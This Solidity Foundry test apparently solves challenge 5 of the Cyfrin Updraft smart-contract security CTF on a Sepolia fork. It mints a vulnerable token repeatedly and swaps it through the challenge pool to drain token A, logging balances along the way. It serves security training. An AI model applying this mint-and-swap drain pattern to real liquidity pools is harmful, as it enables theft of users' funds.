// SPDX-License-Identifier: MIT

pragma solidity =0.8.24;

import {console} from "forge-std/Test.sol";
import {Base} from "../Base.sol";

interface Challenge {
    function solveChallenge(string memory twitterHandle) external;
    function hardReset() external;
    function getPool() external view returns (address);
    function getTokenA() external view returns (address);
    function getTokenB() external view returns (address);
    function getTokenC() external view returns (address);
}
interface S5Token {
    function mint(address to) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}
interface S5Pool {
    function swapFrom(address tokenFrom, address tokenTo, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function redeem(uint64 deadline) external;
}

/// @title Solution for challenge 5 for Cyfrin CTF
/// @author focusoor
///
/// @notice This challenge is part of Cytfin Updraft 'Smart Contract Security' course
/// @notice Link to course section: https://github.com/Cyfrin/security-and-auditing-full-course-s23?tab=readme-ov-file#section-5-nft
contract CtfCyfrin5 is Base {

    Challenge challenge = Challenge(CHALLENGE_5);
    address tokenA;
    address tokenB;
    address tokenC;
    address pool;

    function setUp() public override {
        Base.setUp();
    }

    struct TokensBalances {
        uint256 balanceTokenA;
        uint256 balanceTokenB;
        uint256 balanceTokenC;
        uint256 shares;
    }

    function testSolveChallengeCtfCyfrin5() external {
        vm.selectFork(sepoliaFork);

        // start the challenge with fresh state
        challenge.hardReset();

        // do this after reset, as new pool will be deployed
        tokenA = challenge.getTokenA();
        tokenB = challenge.getTokenB();
        tokenC = challenge.getTokenC();
        pool = challenge.getPool();

        logTokensState();

        // mint some token C
        for (uint256 i = 0; i < 10; ++i) {
            S5Token(tokenC).mint(address(this));
        }

        logTokensState();

        // swap token C to token A
        uint256 thisBalanceTokenC = S5Token(tokenC).balanceOf(address(this));
        S5Token(tokenC).approve(pool, thisBalanceTokenC);
        S5Pool(pool).swapFrom(tokenC, tokenA, thisBalanceTokenC);

        logTokensState();
    
        vm.expectEmit();
        emit ChallengeSolved(address(this), address(challenge), TWITTER_HANDLE);
        challenge.solveChallenge(TWITTER_HANDLE);
    }


    /*//////////////////////////////////////////////////////////////
                                HELPERS
    //////////////////////////////////////////////////////////////*/
    function logTokensState() internal view {
        TokensBalances memory challengeBalancesBefore = TokensBalances({
            balanceTokenA: S5Token(tokenA).balanceOf(address(challenge)),
            balanceTokenB: S5Token(tokenB).balanceOf(address(challenge)),
            balanceTokenC: S5Token(tokenC).balanceOf(address(challenge)),
            shares: S5Pool(pool).balanceOf(address(challenge))
        });

        TokensBalances memory poolBalancesBefore = TokensBalances({
            balanceTokenA: S5Token(tokenA).balanceOf(pool),
            balanceTokenB: S5Token(tokenB).balanceOf(pool),
            balanceTokenC: S5Token(tokenC).balanceOf(pool),
            shares: S5Pool(pool).balanceOf(pool)
        });

        TokensBalances memory thisBalancesBefore = TokensBalances({
            balanceTokenA: S5Token(tokenA).balanceOf(address(this)),
            balanceTokenB: S5Token(tokenB).balanceOf(address(this)),
            balanceTokenC: S5Token(tokenC).balanceOf(address(this)),
            shares: S5Pool(pool).balanceOf(address(this))
        });

        printBalances("Challenge balances", challengeBalancesBefore);
        printBalances("Pool balances", poolBalancesBefore);
        printBalances("This balances", thisBalancesBefore);
        console.log("--------------------------------------------");
    }

    function printBalances(string memory _headerName,TokensBalances memory _balances) internal pure {
        string memory dashLine = "-----------";
        console.log(string.concat(dashLine, string.concat(_headerName, dashLine)));
        console.log("Token A balance: ", _balances.balanceTokenA);
        console.log("Token B balance: ", _balances.balanceTokenB);
        console.log("Token C balance: ", _balances.balanceTokenC);
        console.log("Shares: ", _balances.shares);
    }
}
